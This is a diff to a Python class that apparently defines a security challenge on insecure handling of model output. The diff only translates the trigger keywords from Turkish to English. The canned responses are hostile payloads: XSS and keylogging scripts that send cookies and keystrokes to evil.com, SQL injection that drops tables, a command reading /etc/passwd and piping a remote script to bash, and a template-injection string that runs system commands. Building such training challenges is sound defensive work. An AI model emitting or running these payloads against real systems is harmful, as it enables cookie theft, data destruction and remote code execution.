@@ -46,31 +46,31 @@ class OutputHandlingChallenge(BaseChallenge):
     def get_response_rules(self) -> list[dict]:
         if self.difficulty == Difficulty.EASY:
             return [
-                {"pattern": r"html|sayfa|page|web",
+                {"pattern": r"html|page|web",
                  "response": '<div>Welcome!</div>\n<script>fetch("https://evil.com/steal?c="+document.cookie)</script>'},
-                {"pattern": r"sql|sorgu|query|veritaban",
+                {"pattern": r"sql|query|database",
                  "response": "SELECT * FROM users WHERE name = 'admin'; DROP TABLE users;--"},
-                {"pattern": r"komut|command|shell|calistir|run",
+                {"pattern": r"command|shell|execute|run",
                  "response": "File-handling command:\nos.system('cat /etc/passwd && curl evil.com/shell.sh | bash')"},
-                {"pattern": r"form|input|alan",
+                {"pattern": r"form|input|field",
                  "response": '<form><input type="text" onfocus="fetch(\'https://evil.com/keylog?k=\'+this.value)"></form>'},
-                {"pattern": r"link|url|adres",
+                {"pattern": r"link|url|address",
                  "response": '<a href="javascript:document.location=\'https://evil.com/steal?c=\'+document.cookie">Click here</a>'},
-                {"pattern": r"resim|image|img",
+                {"pattern": r"picture|image|img",
                  "response": '<img src="x" onerror="fetch(\'https://evil.com/xss\')">'},
             ]
         elif self.difficulty == Difficulty.MEDIUM:
             return [
-                {"pattern": r"html|sayfa",
+                {"pattern": r"html|page",
                  "response": '<div>Hello</div><img src=x onerror=fetch("https://evil.com")>'},
-                {"pattern": r"sql|sorgu",
+                {"pattern": r"sql|query",
                  "response": "SELECT * FROM users; DROP TABLE sessions;--"},
-                {"pattern": r"svg|grafik",
+                {"pattern": r"svg|graphic",
                  "response": '<svg onload="fetch(\'https://evil.com/xss\')"><text>Grafik</text></svg>'},
             ]
         else:
             return [
-                {"pattern": r"template|sablon|markdown",
+                {"pattern": r"template|markdown",
                  "response": '{{constructor.constructor("return this.process")().mainModule.require("child_process").execSync("id")}}'},
             ]
 
